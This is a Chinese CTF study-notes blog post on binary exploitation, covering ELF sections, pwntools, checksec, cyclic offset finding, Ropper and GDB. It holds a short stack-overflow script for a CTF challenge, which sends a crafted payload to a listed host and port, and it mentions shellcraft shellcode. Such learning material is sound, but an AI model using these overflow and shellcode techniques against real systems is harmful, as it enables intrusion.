---
title: PWN
date: 2025-02-07 00:05:38
tags:
  - CTF笔记
  - PWN
---

# PWN

## ELF 文件

ELF 文件中包含多个节 section.

| 名称             | 作用                   |
| ---------------- | ---------------------- |
| `.text`          | 代码                   |
| `.rdata`         | 字符串，不可修改的数据 |
| `.data`          | 已经初始化的可修改数据 |
| `.bss`           | 未被初始化的可修改数据 |
| `.ple` 与 `.got` | 动态链接函数地址       |
|                  |                        |

![1](https://ff-0xff.github.io/2020/04/14/GOT%E8%A1%A8/1.png)

> [GOT表介绍的博客](https://ff-0xff.github.io/2020/04/14/GOT%E8%A1%A8/)

``` shell
gdb a.out
start
vmmap
```

用 vmmap 可以看到内存的表

可以看到内存里有 `libc.so` 这个库

libc 直接运行可以显示出版本

``` shell
./libc-2.23.so
```



## 工具

### Pwntool

#### 本地调试

``` python
io = process("./vuln")
```

#### 返回可交互的界面

``` python
from pwn import *
io = remote('ip',port)
io.interactive()
```

#### checksec 查看文件信息

``` shell
checksec get_shell
```

会显示 

* Arch, 架构
* Stack: No canary 说明没有栈canary
* NX 防护. 如果 NX Enabled 说明堆栈不可执行
* PIE：在没有开启PIE的情况下，bss段的地址是固定的

#### ASLR

现代操作系统都默认开启 ASLR

ASLR: 开启时,堆栈,libc 的地址会随机化

### CYCLIC

可以生成可以定位的字符串

``` shell
cyclic 64 # 长度为64
```

确定偏移：先去gdb溢出后找到 Invalid address `0x62616164` 之类的

然后

``` shell
cyclic -l 0x62616164
```

得出偏移，然后可以放在

``` python
asm(shellcraft.sh()).lshift(<偏移量>, 'a')
```



### Stack Overflow 栈溢出

栈溢出是向高地址溢出

> 攻防世界 hello_pwn

``` python
from pwn import *
io = remote("61.147.171.105", 53481)
io.sendline(b"a"*4 + p64(0x6E756161))
io.interactive()
```



## ROP

### Ropper

#### 在Ubuntu添加Kali源

sudo 编辑 `/etc/apt/sources.list` 加入

``` shell
deb http://http.kali.org/kali kali-rolling main contrib non-free
```

然后添加GPG密钥

``` shell
wget -q -O - https://archive.kali.org/archive-key.asc | sudo apt-key add -
```

然后 apt update就可以了

#### 安装Ropper

``` shell
sudo apt install ropper
```

#### 使用 Ropper

打开ropper

``` shell
ropper
```

加载文件

``` shell
file main.main
```

搜索gadget

``` shell
search jmp
```

退出

``` shell
quit
```







## GDB 调试

### TUI

#### 打开TUI

``` shell
tui enable
```

#### 打开汇编窗口

``` shell
layout asm
```

#### 打印

``` shell
print counter
print $r3
```

#### 检查内存

``` shell
x /1wx 0x08000000
x /16wx $sp
```

